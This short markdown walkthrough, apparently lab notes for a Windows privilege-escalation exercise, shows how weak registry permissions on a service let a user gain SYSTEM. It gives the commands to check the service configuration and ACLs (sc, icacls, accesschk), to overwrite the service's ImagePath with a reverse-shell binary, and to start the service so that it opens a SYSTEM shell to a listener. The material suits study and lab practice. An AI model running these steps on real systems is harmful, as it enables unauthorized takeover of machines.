### Service Exploits - Weak Registry Permissions

1. **Query Service Configuration:**
   ```plaintext
   sc qc regsvc
   ```
   - Checks if the service runs with SYSTEM privileges.

2. **Check Registry Permissions Using icacls:**
   ```plaintext
   icacls "hklm:\System\CurrentControlSet\services\regsvc"
   ```
   - The output should show that "NT AUTHORITY\INTERACTIVE" or "BUILTIN\Users" has "F" (Full Control) or "M" (Modify) permissions for the service to be vulnerable.

3. **Check Registry Permissions Using AccessChk:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
   ```
   - Confirms that `NT AUTHORITY\INTERACTIVE` group can write to the service registry key.

4. **Overwrite ImagePath:**
   ```plaintext
   reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
   ```

5. **Exploit:**
   - Start a listener on Kali.
   - Start the service:
     ```plaintext
     net start regsvc
     ```
   - This spawns a reverse shell with SYSTEM privileges.
